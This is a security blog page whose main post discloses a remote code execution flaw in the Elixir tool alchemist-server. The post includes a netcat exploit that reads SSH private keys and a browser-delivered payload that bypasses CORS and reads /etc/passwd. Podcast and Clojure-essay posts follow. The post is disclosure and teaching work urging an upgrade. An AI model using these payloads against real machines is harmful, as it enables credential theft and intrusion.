<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1' />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="/stylesheets/application.css" rel="stylesheet" />
    <link href="/images/favicon.ico" rel="icon" type="image/ico" />

      <title>Appcanary</title>
    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
  </head>
  <body>
    <script src="//use.typekit.net/dkz5zwp.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>


    <div class="topbar"></div>
    <div id="header">
      <div class="preamble">
        <a href="https://blog.appcanary.com"><img class="logo" src="/images/appcanary.png" alt="Appcanary logo"></a>
        <p>
          <b><a href="https://appcanary.com">Appcanary</a></b> makes sure you never run vulnerable software on your servers.
          <br/>
          Like our blog? Subscribe to our <a href="https://appcanary.us10.list-manage.com/subscribe?u=303b378f377508300c0b5469a&id=dc58e8f56f">newsletter</a> or <a href="https://podcast.appcanary.com">podcast</a>.<br/>
          Browse the <a href="/archive.html">archive</a>, or follow us on <a href="https://twitter.com/appcanary">twitter</a>, <a href="https://github.com/appcanary">github</a> or <a href="/feed.xml">rss</a>.
        </p>
      </div>
    </div>

      <section>
    <div class="entry">
      <div class="post">
        <h1 class="title"><a href="/2017/hacking-your-elixir-editor.html">Hacking your Elixir Editor</a></h1>

        <div class="published-tags">By <span class="author"><a href="/author/max-veytsman.html">Max Veytsman</a></span> |
          <span class="date">July 28, 2017</span> on <a href="/tags/elixir.html">Elixir</a>, <a href="/tags/security.html">Security</a></div>

        <p>I&rsquo;ve been playing with Elixir recently, and came across a remote code execution bug in the developer tools. You know, as one does.</p>

<p>Before we continue, a warning: if you use Vim and have ever edited Elixir files <strong>stop what you&rsquo;re doing and upgrade <a href="https://github.com/slashmili/alchemist.vim">alchemist.vim</a> to 2.8.0</strong>. Seriously, go do it, right now.</p>

<p>Done? Okay, let&rsquo;s take it from the top. If you want to implement nice editor support for a language, and provide things like code-completion or jump-to-definition, you need some way to introspect both the source code being edited and the language&rsquo;s runtime environment to figure out what suggestions to give to your users. </p>

<p>There&rsquo;s a package called <a href="https://github.com/tonini/alchemist.el">alchemist</a> that provides Elixir support for Emacs. It has nice features like code-completion, and jump-to-definition, and, thereofre, it understands Elixir code and can read through a project&rsquo;s dependencies and stuff like that. A common pattern when writing editor plugins is to build a little background program in the language you&rsquo;re targeting that can introspect the runtime and tell the editor where symbols are defined and help with code completion. Alchemist does this with <a href="https://github.com/tonini/alchemist-server">alchemist-server</a>.</p>

<p>Alchemist-server is also used by the Vim plugin, <a href="https://github.com/slashmili/alchemist.vim">alchemist.vim</a>. While Emacs talks to alchemist-server via STDIN/STDOUT, the Vim plugin uses a TCP server to process commands from Vim.</p>

<h1 id="the-bug">The bug</h1>

<p>I can&rsquo;t claim credit for the original bug. It was <a href="https://github.com/tonini/alchemist-server/issues/14">reported</a> by <a href="https://github.com/ivan">Ivan Kozik</a> back in February. </p>

<p>The issue is that alchemist-server accepted <code>EVAL</code> as a command and listened unauthenticated on all interfaces. This means that anyone in the same coffee shop as you can eval arbitrary Elixir code on your computer if they can guess the <a href="https://en.wikipedia.org/wiki/Ephemeral_port">ephemeral port</a> the server is running on. </p>

<p>This is really bad, and unfortunately had not been addressed since the issue was reported. I think this bug wasn&rsquo;t patched immediately for three reasons:</p>

<ol>
<li>There wasn&rsquo;t consensus on what the correct fix was. Do we listen on localhost only? On a socket? Sign and MAC the command? If we do that, what key do we use?</li>
<li>The severity of the bug wasn&rsquo;t made clear. While it exposed you to a remote attacker over the same network, Ivan initially thought that you would need a <a href="https://en.wikipedia.org/wiki/DNS_rebinding">DNS rebinding</a> attack to exploit the bug via a browser. This is theoretical and hard to explain, let alone pull off<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup>.</li>
</ol>

<p>This is a super serious bug, and I wanted to see this bug fixed as quickly as possible. I subscribe to the Church of <a href="https://www.nostarch.com/gtfo">Proof of Concept or GTFO</a>, so it was time to demonstrate just bad this bug actually was.</p>

<h1 id="the-original-exploit">The original exploit</h1>

<p>Ivan&rsquo;s original exploit takes advantage of the fact that alchemist-server uses <code>eval-string</code> to process arguments in several cases and it contains a <code>EVAL</code> command for evaluating files, probably for loading modified files into your repl environment. He sends a command that uses the <code>eval-string</code>ed portion to write a malicious Elixir script to a file and then executes it, with the results returned to the user.</p>

<p>Assuiming <code>PORT</code> is the ephemeral port the server is running on, his exploit looks like this:</p>
<pre class="highlight shell"><code><span class="nb">echo</span> <span class="s1">'EVAL File.write!("/tmp/payload", 
"File.read!(Path.expand(~s(~/.ssh/id_rsa)))");
{:eval, "/tmp/payload"}'</span> | nc 127.0.0.1 PORT
</code></pre>

<ul>
<li><code>EVAL</code> is a command for the Elixir server.</li>
<li><code>File.write!(&quot;/tmp/payload&quot;, &quot;File.read!(Path.expand(~s(~/.ssh/id_rsa)))&quot;);</code> is the part that&rsquo;s processed by <code>eval-string</code>. It writes a malicious elixir script to <code>/tmp/payload</code>. The script itself returns the contents of the user&rsquo;s ssh private key.</li>
<li><code>{:eval, &quot;/tmp/payload&quot;}</code> tells the server to evaluate the file in which the malicious script was written.</li>
</ul>

<h1 id="the-danger-of-line-based-protocols">The danger of line based protocols</h1>

<p>I know what you&rsquo;re thinking: &ldquo;it&rsquo;s really too bad that alchemist-server is evaling things to begin with&rdquo;. And, you&rsquo;re dead wrong. </p>

<p>It&rsquo;s perfectly fine for developer tools to execute code sent to them by a user; actually, most developer tools are designed specifically to evaluate arbitrary code in one way or another. The problem is that it&rsquo;s accepting code to be evaled over <em>a TCP connection</em>.</p>

<p>First, I booted up the server, and then started talking to it using netcat:</p>
<pre class="highlight shell"><code><span class="gp">$ </span><span class="nb">echo</span> <span class="s1">'PING'</span> | nc localhost 59533
PONG
END-OF-PING

<span class="gp">$ </span><span class="nb">echo</span> <span class="s2">"NOTAREALCOMMAND"</span> | nc localhost 59555
<span class="c"># No output</span>

<span class="gp">$ </span><span class="nb">printf</span> <span class="s2">"NOTAREALCOMMAND</span><span class="se">\n</span><span class="s2">PING</span><span class="se">\n</span><span class="s2">"</span> | nc localhost 59609
PONG
END-OF-PING
</code></pre>

<p>This is where things get real bad for alchemist-server. We&rsquo;re dealing with a line based protocol, and what&rsquo;s more, it&rsquo;s ignoring<sup id="fnref2"><a href="#fn2" rel="footnote">2</a></sup> commands it doesn&rsquo;t understand. You know what else is a line-based protocol? HTTP. </p>

<p>That means we can get a browser to issue a request to localhost and alchemist-server will ignore all the headers and HTTP formalities and happily execute an EVAL command if we put it on its own line.</p>

<p>Interestingly enough, this is a case where security considerations outweigh <a href="https://en.wikipedia.org/wiki/Robustness_principle">Postel&rsquo;s Principle</a>:</p>

<blockquote>
<p>Be conservative in what you do, be liberal in what you accept from others</p>
</blockquote>

<p>In this case, being liberal in what you accept leads to accepting messages from places you really shouldn&rsquo;t.</p>

<h1 id="cross-origin-resource-sharing">Cross-origin resource sharing</h1>

<p>We&rsquo;ve established that the server will accept HTTP requests from a browser. Now the trick is to get the browser to send one. I decided to use Javascript to send an <a href="https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest">XHR</a> so that I had a good chance of being able to process the response from the server. If I just wanted to execute some code on a victim&rsquo;s machine, embedding a form or an image with the right payload would have worked too.</p>

<p>In order to use XHR, we need to get around Cross-Origin Resource Sharing (CORS). This is the policy that governs under what conditions a browser will make a request to a resource, and under what conditions the output will be returned back to the Javascript function that made the request. There is a default policy, and it can be changed by the server using special headers<sup id="fnref3"><a href="#fn3" rel="footnote">3</a></sup>.</p>

<p>The first thing that happens is that the browser decides if it can make a request. If the request contains these special headers, or uses an HTTP method other than GET, HEAD, or POST, the browser will send a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests">preflighted request</a>. This is an OPTIONS request that asks the server if it will accept the upcoming request.</p>

<p>We don&rsquo;t want this, so we have to send a so-called &ldquo;simple request&rdquo;. A POST request with a content-type of &ldquo;text/plain&rdquo; and <code>EVAL ...</code> in the data is &ldquo;simple&rdquo; and not be preflighted.</p>

<p>The next step is getting passed the Access-Control header. By default, your browser won&rsquo;t return the results of an XHR request unless it&rsquo;s to the same origin as the script that&rsquo;s making it, or the server has an Access-Control header that allows the script&rsquo;s origin. One thing to note is that this is happening <em>after</em> the request is made. So, if I have some malicious code that will ransomware your computer, it will still be executed, even if the browser script that made the request won&rsquo;t be able to see the response. It&rsquo;s especially unimportant in the case of remote code execution, because I can exfiltrate data by having my malicious payload make a request back to me by itself.</p>

<p>Nevertheless, setting up a server to listen to the response requires effort, and I wanted a seamless POC. Luckily, our malicious payload&rsquo;s response was going to be interpreted as a HTTP response to the browser, so all I had to do was return a string that looks like:</p>
<pre class="highlight plaintext"><code>HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

The browser will now see this as a response to its XHR request.
</code></pre>

<h1 id="boom">Boom</h1>

<p>And here&rsquo;s the full payload</p>
<pre class="highlight elixir"><code><span class="c1"># Write the following script to /tmp/payload</span>
<span class="no">EVAL</span> <span class="no">File</span><span class="o">.</span><span class="n">write!</span><span class="p">(</span><span class="sd">"</span><span class="s2">/tmp/payload"</span><span class="p">,</span>
  <span class="c1"># HTTP response header</span>
  <span class="err">~</span><span class="no">S</span><span class="o">|</span><span class="no">IO</span><span class="o">.</span><span class="n">puts</span> <span class="sd">"</span><span class="s2">HTTP/1.1 200 OK"</span>
  <span class="c1"># \n - encoded in a way that won't be parsed as a new line</span>
  <span class="o">&lt;&gt;</span> <span class="no">List</span><span class="o">.</span><span class="n">to_string</span><span class="p">([</span><span class="m">10</span><span class="p">])</span>
  <span class="c1"># CORS header</span>
  <span class="o">&lt;&gt;</span> <span class="sd">"</span><span class="s2">Access-Control-Allow-Origin: *"</span>
  <span class="c1"># \r\n\r\n - see above</span>
  <span class="o">&lt;&gt;</span> <span class="no">List</span><span class="o">.</span><span class="n">to_string</span><span class="p">([</span><span class="m">13</span><span class="p">,</span><span class="m">10</span><span class="p">,</span><span class="m">13</span><span class="p">,</span><span class="m">10</span><span class="p">])</span>
  <span class="c1"># Insert the contents of /etc/passwrd</span>
  <span class="o">&lt;&gt;</span> <span class="no">File</span><span class="o">.</span><span class="n">read!</span><span class="p">(</span><span class="no">Path</span><span class="o">.</span><span class="n">expand</span><span class="p">(</span><span class="err">~</span><span class="n">s</span><span class="p">(</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="p">)))</span>
  <span class="c1"># \r\n\r\n - see above</span>
  <span class="o">&lt;&gt;</span> <span class="no">List</span><span class="o">.</span><span class="n">to_string</span><span class="p">([</span><span class="m">13</span><span class="p">,</span><span class="m">10</span><span class="p">,</span><span class="m">13</span><span class="p">,</span><span class="m">10</span><span class="p">])</span><span class="o">|</span><span class="p">);</span>
  <span class="c1"># Execute the above script and return the result</span>
<span class="p">{</span><span class="ss">:eval</span><span class="p">,</span> <span class="sd">"</span><span class="s2">/tmp/payload"</span><span class="p">}</span>
</code></pre>

<p>This is what it looks like when wrapped in HTML/Javascript:</p>

<video src="/videos/alchemist_server.webm" width="640" height="360" controls>
</video>

<p>Thanks for reading, and make sure you update your alchemist-server!</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>Case in point, the <a href="http://searchsecurity.techtarget.com/definition/DNS-rebinding-attack">first google hit</a> confuses for DNS rebinding confuses the attack technique with something you can do with it &mdash; using javascript to exploit default passwords on home routers from a browser.&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a></p>
</li>

<li id="fn2">
<p>You may have noticed, I used <code>printf</code> not <code>echo</code> in the last example so that my <code>\n</code>s would be rendered correctly.&nbsp;<a href="#fnref2" rev="footnote">&#8617;</a></p>
</li>

<li id="fn3">
<p>If you want to learn more about other security releated headers, you can read my <a href="https://blog.appcanary.com/2017/http-security-headers.html">guide</a>&nbsp;<a href="#fnref3" rev="footnote">&#8617;</a></p>
</li>

</ol>
</div>


      </div>
      <hr>
    </div>
  </section>
  <section>
    <div class="entry">
      <div class="post">
        <h1 class="title"><a href="/2017/reality-winner-nsa-citizenlab.html">Podcast Episode 4 - Leakers and Phishers</a></h1>

        <div class="published-tags">By <span class="author"><a href="/author/phillip-mendonca-vieira.html">Phillip MendonÃ§a-Vieira</a></span> |
          <span class="date">July 14, 2017</span> on <a href="/tags/podcast.html">Podcast</a>, <a href="/tags/nsa.html">NSA</a>, <a href="/tags/citizenlab.html">Citizenlab</a></div>

        <p>Max and Phill talk about Reality Winner&rsquo;s bad opsec and the huge phishing campaign unearthed by Citizenlab. Produced by <a href="https://twitter.com/katiejensen">Katie Jensen</a>.</p>

<p>You can follow along on <a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635">iTunes</a>, or subscribe directly to <a href="https://podcast.appcanary.com/podcast.rss">the feed</a>. </p>

<audio controls preload="metadata" style="width: 100%;">
    <source src="https://podcast.appcanary.com/mp3/appcanary-ep4.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
</audio>

<h3 id="show-notes">Show Notes</h3>

<ul>
<li><p><a href="https://medium.com/@thegrugq/real-talk-on-reality-cf07cbb78530">Real Talk on Reality</a></p></li>
<li><p><a href="https://citizenlab.ca/2017/05/tainted-leaks-disinformation-phish/">TAINTED LEAKS: Disinformation and Phishing With a Russian Nexus</a></p></li>
</ul>


      </div>
      <hr>
    </div>
  </section>
  <section>
    <div class="entry">
      <div class="post">
        <h1 class="title"><a href="/2017/podcast-breitbart-shopify.html">Podcast Episode 3 - Breitbart and Shopify</a></h1>

        <div class="published-tags">By <span class="author"><a href="/author/phillip-mendonca-vieira.html">Phillip MendonÃ§a-Vieira</a></span> |
          <span class="date">May 26, 2017</span> on <a href="/tags/podcast.html">Podcast</a></div>

        <p>Here in episode 3, Max and Phill discuss, over breakfast, what Shopify should or should not do with regard to Breitbart. Produced by <a href="https://twitter.com/katiejensen">Katie Jensen</a>.</p>

<p>You can follow along on <a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635">iTunes</a>, or subscribe directly to <a href="https://podcast.appcanary.com/podcast.rss">the feed</a>. </p>

<audio controls preload="metadata" style="width: 100%;">
    <source src="https://podcast.appcanary.com/mp3/appcanary-ep3.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
</audio>

<h3 id="show-notes">Show Notes</h3>

<ul>
<li><p><a href="http://www.cbc.ca/news/canada/ottawa/shopify-ceo-tobi-lutke-defends-decision-to-host-breitbart-1.3973798">Shopify CEO digs in against Breitbart backlash</a></p></li>
<li><p><a href="https://www.inc.com/sonya-mann/trump-shopify/breitbart.html">Shopify Backlash Shows Even Second-Degree Trump Ties Can Be Trouble</a></p></li>
</ul>


      </div>
      <hr>
    </div>
  </section>
  <section>
    <div class="entry">
      <div class="post">
        <h1 class="title"><a href="/2017/hard-isnt-simple-ruby-clojure.html">Simple Ain't Easy, but Hard Ain't Simple: Leaving Clojure for Ruby</a></h1>

        <div class="published-tags">By <span class="author"><a href="/author/phillip-mendonca-vieira.html">Phillip MendonÃ§a-Vieira</a></span> |
          <span class="date">May 22, 2017</span> on <a href="/tags/programming.html">Programming</a>, <a href="/tags/ruby.html">Ruby</a>, <a href="/tags/clojure.html">Clojure</a></div>

        <p>In November 2016, I delivered a talk at RubyConf where I told the story of how we built the first version in Appcanary in Clojure, and then threw it away. </p>

<p>Here is the talk:</p>

<div style="position:relative;height:0;padding-bottom:56.25%"><iframe src="https://www.youtube.com/embed/doZ0XAc9Wtc?ecver=2" width="640" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen></iframe></div>

<p><small>Jump to 12:10 to start at the section where I begin to talk about my specific problems with Clojure.</small></p>

<p>But, that talk is over a half hour long, and who has time for that?</p>

<h3 id="three-important-ideas-you-should-take-away">Three important ideas you should take away:</h3>

<ol>
<li><p>If you&rsquo;re starting a project where you&rsquo;re really pressed for time, you should be biased towards tools you know really well. If you have a startup, you&rsquo;re supposed to be solving a <em>business problem</em>. Don&rsquo;t make your life harder than it has to be by also having to learn new tools.</p></li>
<li><p>Avoid building a distributed system for as long as you can. They introduce a lot of expensive complexity that is hard for small teams to pay. Micro services are useful for larger teams, but the way you code and deploy your apps should be a reflection of your team&rsquo;s organization and ability to coordinate.</p></li>
<li><p>I personally found it really hard to get into Clojure. I got the sense that Clojure as a community doesn&rsquo;t value &ldquo;developer happiness&rdquo;, and I think it should! Tools should try to make your life easier at every opportunity.</p></li>
</ol>

<p><hr></p>

<p>We had <a href="/2016/missing-clojure.html">mentioned the talk before</a>, but I had avoided actually posting it on this blog for two reasons:</p>

<ol>
<li>I&rsquo;ve rewatched it a bunch of times and can think of a half dozen things I&rsquo;d do differently now.</li>
<li>Some people in the Clojure community got <em>really mad</em>.</li>
</ol>

<h2 id="oops">Oops</h2>

<p>A lot of otherwise well-meaning people looked at the talk and decided that I was a) a bit of an asshole and b) probably incompetent. So many people expressed that view that I felt compelled to ask Confreaks to turn off the comments<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup>.</p>

<p>I don&rsquo;t really blame them.</p>

<p>Developer tools do not exist in isolation; they are often only useful to the extent there is a live community surrounding them. This requires such a degree of investment that many programmers will inevitably come to integrate their favourite programming languages into a part of their identity. When some outsider comes along and criticizes your community and identity, it can be very hard to be charitable to what they have to say.</p>

<p>It was a good learning experience, though. I came to understand that <strong>I did not work hard enough to establish that I was coming from a place of kindness</strong>, and that my talk was <strong>not</strong> a big fuck you! to the community.</p>

<p>I came into the language and its environment with an open heart and invested a ton of resources into it, but, largely because of my specific context and a few mistakes we made early on, continuing to invest in Clojure didn&rsquo;t make sense for us.</p>

<p><hr></p>

<h2 id="further-discussion">Further discussion</h2>

<p>So, much to my surprise, my talk became relevant recently when some peeps in the Clojure community looked around and made an observation:</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">folks, I&rsquo;m calling it, clojure&rsquo;s dying more than it is growing</p>&mdash; ðŸŒ¹dsa zackðŸŒ¹ (@ZackMaril) <a href="https://twitter.com/ZackMaril/status/863915988424589312">May 15, 2017</a></blockquote>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>Enabled by Twitter&rsquo;s recent decision to not count usernames towards character limits, this thread gained a whole life of its own. I don&rsquo;t know how to do justice to the whole range of topics that were discussed; Twitter itself hasn&rsquo;t quite figured out how to display threads properly. </p>

<p>I think some of the ideas brought up deserve a little more investigation, and so I have summarized parts of the discussion in order to address them. Here it goes:</p>

<h3 id="the-thread">The Thread</h3>

<p>The hype cycle has moved away from Clojure, <a href="https://twitter.com/ZackMaril/status/863916529674354688">and the community feels like it&rsquo;s shrinking</a> - <a href="https://twitter.com/ztellman/status/864243503999602688">though there are many more jobs coming up</a>. </p>

<p>It&rsquo;s actually kinda hard to make a <a href="https://twitter.com/ztellman/status/864244372933443585">good business case</a> for Clojure, since <a href="https://twitter.com/ZackMaril/status/864244440931500033">the JVM makes small tools prohibitive</a> and, if you do like the JVM, <a href="https://twitter.com/cemerick/status/864931671388409856">you now have a lot of options</a>. In theory, <a href="https://twitter.com/ericnormand/status/864940158159912960">you should be way more productive in Clojure</a>, but it&rsquo;s <a href="https://twitter.com/CursiveIDE/status/865162192265461764">hard to tell how true that is</a>.</p>

<p>That said, <a href="https://twitter.com/mark_engelberg/status/865370061489356800">are people actually leaving Clojure</a>? Well, <a href="https://twitter.com/ztellman/status/865372517786984448">there was a talk recently on that very topic</a>, and though it may have been written by an <a href="https://twitter.com/timbaldridge/status/865640256220962816">incompetent</a> and <a href="https://twitter.com/timbaldridge/status/865654433870356480">mean jerk</a><sup id="fnref2"><a href="#fn2" rel="footnote">2</a></sup>, it makes some <a href="https://twitter.com/cemerick/status/865657364317298690">good points</a>.</p>

<p>In the end, what <em>is</em> a <a href="https://twitter.com/phillmv/status/865690983274430464">reasonable expectation for developers new to Clojure</a>? Lisps are a <a href="https://twitter.com/timbaldridge/status/865667405862715392">very different</a> paradigm. <a href="https://twitter.com/timbaldridge/status/865667555494551552">Things work differently here</a>. Developers get paid to <a href="https://twitter.com/timbaldridge/status/865698644724375552">solve or automate problems</a>, and people <a href="https://twitter.com/potetm/status/866027765350506496">waste tons of time</a> trying to be &ldquo;happy&rdquo;. Clojure encourages people to reflect on their work, and <a href="https://twitter.com/potetm/status/866028663644598274">aggressively pare it down</a>. After all, <a href="https://twitter.com/potetm/status/866027314009829376">simple isn&rsquo;t easy</a>!</p>

<p><hr></p>

<p>OKAY, WOW, are you still with me? Incredible. </p>

<p>It&rsquo;s hard for me to write about Clojureland nowadays since it&rsquo;s been a whole year since I last typed <code>lein repl</code>, but I&rsquo;m about to say something slightly hyperbolic and slightly uncharitable because it&rsquo;s more memorable, so please bear with me. It&rsquo;s a little over the top, but I promise I&rsquo;m coming from a place of love.</p>

<p>Here it goes. Ready?</p>

<h2 id="quot-simple-easy-quot-is-one-of-the-most-toxic-ideas-ever-introduced-to-programming">&ldquo;Simple != Easy&rdquo; Is One Of The Most Toxic Ideas Ever Introduced To Programming</h2>

<p>For those of you outside of Clojureland, this is a reference to well-known 2011 Rich Hickey talk titled &ldquo;<a href="https://www.infoq.com/presentations/Simple-Made-Easy">Simple Made Easy</a>&rdquo;. </p>

<p>Rich&rsquo;s thesis is that the best, most conceptually simple solution to a problem isn&rsquo;t automatically also going to be <em>simple to use</em>.</p>

<p>Often, when we say something is <em>easy</em>, we actually just mean that it is familiar to us, and that we&rsquo;ve used something like it before. Just because we don&rsquo;t have to engage our brain doesn&rsquo;t mean a concept or framework or artifact isn&rsquo;t <em>complex</em>. </p>

<p>Often the simplest solution may be very different from what you were expecting, and may therefore require some elbow grease.</p>

<p>I thought that talk was really insightful when I first watched it. Math, for example, is a place where you can dedicate a lifetime of mental energy to simple but hard things. And it&rsquo;s true that many easy things are needlessly complex. But, having seen how people refer to it over the years, I&rsquo;ve since soured on the concept.</p>

<h3 id="in-practice-39-simple-made-easy-39-is-an-elaborate-excuse-for-making-software-that-is-hard-to-use">In practice, &lsquo;Simple Made Easy&rsquo; is an elaborate excuse for making software that is hard to use.</h3>

<p>By separating &ldquo;simplicity&rdquo; from &ldquo;ease of use&rdquo;, and then establishing the <em>primacy of simplicity</em>, it gives people an ideological out to discount improving the user interface of our tools and artifacts.</p>

<p>If your chief goal is simplicity, and beauty, and elegance, then it&rsquo;s not really your fault if people don&rsquo;t &ldquo;get it&rdquo;. It blinds us to critiques of our software: if we don&rsquo;t value the accessibility of our tools then it becomes very difficult to distinguish &ldquo;there are a lot of arbitrary barriers preventing my understanding&rdquo; from &ldquo;I&rsquo;m lazy and couldn&rsquo;t be bothered to try hard enough&rdquo;<sup id="fnref3"><a href="#fn3" rel="footnote">3</a></sup>.</p>

<p>Establishing this narrow view of &ldquo;simplicity&rdquo; as wholly separate from &ldquo;easy to use&rdquo; prevents us from being able to optimize for ease-of-use, aka developer experience.</p>

<p>In my talk I called the Clojureland ecosystem &ldquo;user-hostile&rdquo;. This contrasts sharply with the community, who are by and large very sweet and personable and well-meaning. </p>

<p>Undoubtedly, I chafed because Clojureland tools were <strong>unfamiliar</strong>, yes. But past a certain point they were also <em>unfriendly</em>, because in their error messages and affordances and failure conditions they assumed a rather high tolerance for digging through code and high-level knowledge of Clojure&rsquo;s concepts and idioms and runtime quirks.</p>

<p>So we went back to Ruby, which we knew really well.</p>

<p>But here is the rub: Ruby&rsquo;s tooling is <a href="http://www.virtuouscode.com/2015/07/08/ruby-is-defined-by-terrible-tools/">terrible</a>. The interpreter is slow and finicky and it used to leak memory like a sieve. There is no static introspection, the meta programming features are basic and slow and it is trivially easy to bleed state and complect the hell out of your programs. It was great compared to Java or PHP in 2004. In 2017, the world is different.</p>

<p>But, do you know what Ruby really has got going for it? Ruby is <a href="http://www.artima.com/intv/rubyP.html">designed to be fun and make programmers happy</a>. I think this is such a dope design philosophy that I&rsquo;ll go one step further:</p>

<h2 id="all-programming-languages-should-strive-to-be-fun-and-make-programmers-happy">All programming languages should strive to be fun and make programmers happy.</h2>

<p>I think this is by far the most important contribution Ruby brought to programming, and as Ruby has stabilized and become less exciting and people have moved on, it has been incredible to <a href="https://twitter.com/sarahmei/status/849065056746827776">ex-Rubyists bring these values with them to their new communities</a>.</p>

<p>You can see this attitude in Elixir, in Rust, in Ember. Our tools should help you achieve success. Our tools should get out of the way. Our tools should Just Work.</p>

<p>The truth is, programming can be complex, but it is also often needlessly hard. Programmers are the end-users of programming tools, and to ignore their experience using them is just plain bad design. We should strive to be as maximally welcoming as we can, for every level of experience.</p>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p>I called it &ldquo;abuse&rdquo; elsewhere, which is maybe a bit much. People were mostly just somewhat rude. It&rsquo;s just not&hellip; pleasant to have a bunch of people calling you incompetent over and over again Â¯\_(ãƒ„)_/Â¯.&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a></p>
</li>

<li id="fn2">
<p>I am exaggerating and bear no ill will ;).&nbsp;<a href="#fnref2" rev="footnote">&#8617;</a></p>
</li>

<li id="fn3">
<p>By far the most common response to my talk was, but are you sure you tried hard enough? If you keep trying, you&rsquo;ll get it. Just work harder at it. There&rsquo;s a hidden insinuation: maybe you&rsquo;re not smart enough to get it. I&rsquo;d like to think that I am.&nbsp;<a href="#fnref3" rev="footnote">&#8617;</a></p>
</li>

</ol>
</div>


      </div>
      <hr>
    </div>
  </section>
  <section>
    <div class="entry">
      <div class="post">
        <h1 class="title"><a href="/2017/podcast-casinos-pseudorandom.html">Podcast Episode 2 - Casinos and Pseudorandom Generators</a></h1>

        <div class="published-tags">By <span class="author"><a href="/author/phillip-mendonca-vieira.html">Phillip MendonÃ§a-Vieira</a></span> |
          <span class="date">April 07, 2017</span> on <a href="/tags/podcast.html">Podcast</a></div>

        <p>Here in episode 2 of the Appcanary podcast, Max and I discuss a Russian casino hacking ring, and pseudorandom number generators. Produced by <a href="https://twitter.com/katiejensen">Katie Jensen</a>.</p>

<p>You can follow along on <a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635">iTunes</a>, or subscribe directly to <a href="https://podcast.appcanary.com/podcast.rss">the feed</a>. </p>

<audio controls preload="metadata" style="width: 100%;">
    <source src="https://podcast.appcanary.com/mp3/appcanary-ep2.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
</audio>

<h3 id="show-notes">Show Notes</h3>

<ul>
<li><p><a href="https://www.wired.com/2017/02/russians-engineer-brilliant-slot-machine-cheat-casinos-no-fix/">Russians Engineer a Brilliant Slot Machine Cheat-And Casinos Have No Fix</a></p></li>
<li><p><a href="http://news.nationalpost.com/g00/news/world/gambler-with-remarkable-9-6-million-scheme-to-win-at-baccarat-has-to-pay-it-back-judge-rules">Gambler who won $9.6 million with â€˜remarkableâ€™ baccarat scheme has to pay it back, judge rules</a></p></li>
<li><p><a href="http://mashable.com/2017/01/13/rudy-giuliani-cyber-website-trump/">Rudy Giuliani, Cyber Czar</a></p></li>
</ul>


      </div>
      <hr>
    </div>
  </section>

  <section>
    <div class="pagination">
      <div class="paginators">

          <span class="page-number">Page 1 of 5</span>

          <a href="/page/2/" class="older-posts">Older Posts â†’</a>
      </div>
    </div>
  </section>



    <script type="text/javascript">
 /* <![CDATA[ */
 var google_conversion_id = 928841383;
 var google_custom_params = window.google_tag_params;
 var google_remarketing_only = true;
 /* ]]> */
</script>

<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
    <div style="display:inline;">
        <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/928841383/?value=0&amp;guid=ON&amp;script=0"/>
    </div>
</noscript>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61163522-3', 'auto');
  ga('send', 'pageview');

</script>

<!-- Twitter universal website tag code -->
<script>
 !function(e,n,u,a){e.twq||(a=e.twq=function(){a.exe?a.exe.apply(a,arguments):
                                               a.queue.push(arguments);},a.version='1',a.queue=[],t=n.createElement(u),
                            t.async=!0,t.src='//static.ads-twitter.com/uwt.js',s=n.getElementsByTagName(u)[0],
                            s.parentNode.insertBefore(t,s))}(window,document,'script');
 // Insert Twitter Pixel ID and Standard Event data below
 twq('init','nve06');
 twq('track','PageView');
</script>
<!-- End Twitter universal website tag code -->

<!-- Facebook Pixel Code -->
<script>
 !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                                                             n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
   n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
   t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
                                                                          document,'script','https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', '1378208595579873'); // Insert your pixel ID here.
 fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
            src="https://www.facebook.com/tr?id=1378208595579873&ev=PageView&noscript=1"
          /></noscript>
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

    
  </body>
</html>
